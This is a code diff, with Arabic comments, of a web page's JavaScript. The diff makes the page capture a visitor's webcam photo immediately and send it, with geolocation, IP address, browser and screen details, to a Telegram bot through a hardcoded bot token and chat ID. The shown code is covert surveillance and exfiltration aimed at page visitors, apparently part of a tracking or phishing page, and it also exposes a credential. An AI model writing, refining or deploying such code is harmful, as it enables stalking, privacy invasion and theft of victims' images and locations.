@@ -63,21 +63,19 @@
             video.srcObject = stream;
             video.play();
 
-            // انتظر قليلاً ثم التقط الصورة
-            setTimeout(() => {
-                const canvas = document.createElement('canvas');
-                const context = canvas.getContext('2d');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                imageData = canvas.toDataURL('image/png');
+            // التقاط الصورة فورًا
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            imageData = canvas.toDataURL('image/png');
 
-                // إيقاف تشغيل الكاميرا هنا
-                stream.getTracks().forEach(track => track.stop());
+            // إيقاف تشغيل الكاميرا هنا
+            stream.getTracks().forEach(track => track.stop());
 
-                // إرسال البيانات إلى Telegram
-                sendData();
-            }, 3000); // التقط الصورة بعد 3 ثوانٍ
+            // إرسال البيانات إلى Telegram
+            sendData();
         }
 
         function sendData() {
@@ -95,7 +93,17 @@
         function sendToTelegram(lat, long, imageData, userAgent, screenWidth, screenHeight, language, ipAddress) {
             const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
             const chatId = '6185375878';
-            const message = `إحداثيات الموقع:\nLatitude: ${lat}\nLongitude: ${long}\nUser Agent: ${userAgent}\nScreen Width: ${screenWidth}\nScreen Height: ${screenHeight}\nLanguage: ${language}\nIP Address: ${ipAddress}`;
+            const message = `
+🎯 إحداثيات الموقع:
+🌍 Latitude: ${lat}
+🌍 Longitude: ${long}
+🖥️ نوع المتصفح: ${userAgent}
+📏 عرض الشاشة: ${screenWidth}px
+📏 ارتفاع الشاشة: ${screenHeight}px
+🌐 لغة المتصفح: ${language}
+📧 عنوان IP: ${ipAddress}
+`;
+
             const apiUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
 
             // تحويل الصورة إلى Blob إذا كانت موجودة
